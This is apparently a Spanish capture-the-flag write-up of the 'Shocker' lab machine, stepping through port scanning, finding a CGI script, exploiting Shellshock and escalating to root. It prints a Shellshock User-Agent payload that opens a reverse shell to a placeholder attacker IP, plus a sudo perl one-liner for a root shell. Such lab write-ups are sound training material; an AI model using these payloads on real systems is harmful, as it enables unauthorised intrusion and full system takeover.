<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Shocker</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Shocker</h1><br/><p><ol><li>Realizo un escaneo de puertos</br><strong> nmap -Pn -sC -sV -p- --open 10.10.10.56 -oN scan.txt</strong></li><li>Están los servicios <strong>SSH</strong> y <strong>HTTP</strong> abiertos</li><li>Hago una vista por encima a la página pero no veo nada interesante</li><li>Miro el código de la página y no veo nada interesante</li><li>Realizo un escaneo de directorios para ver si encuentro algo interesante</li><li>No encuentro nada</li><li>Voy a volver y voy a analizar el directorio /cgi-bin/</li><li>Encuentro /cgin-bin/user.sh </li></ol><img src="images/37-1.png" alt="images/37-1.png" /><ol><li>Al entrar en esta ruta se nos descarga un archivo</li><li>Analizo la ruta con burpsuite</li><li>Lo envio al repeater</li><li>Es una solicitud <strong>GET</strong></li><li>Creo que tiene la  vulnerabilidad <strong>Shellshock</strong> </li></ol><img src="images/37-2.png" alt="images/37-2.png" /><ol><li>Puedo obtener un reverse shell a través de ahí<strong> User-Agent: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1</strong></li><li>Obtengo el reverse shell</li><li>Obtengo la flag user.txt</li><li>Realizo un <strong>sudo -l</strong> para ver que puedo ejecutar como root</li><li>Encuentro que puedo ejecutar el comando perl como root</li><li>Busco en gtfobinds y encuentro como escalar privilegios</br><strong> sudo perl -e &#39;exec &quot;/bin/sh&quot;;&#39;</strong></li><li>Encuentro la flag root.txt</li></ol></p><p align="center"></p></div>
</body>
</html>
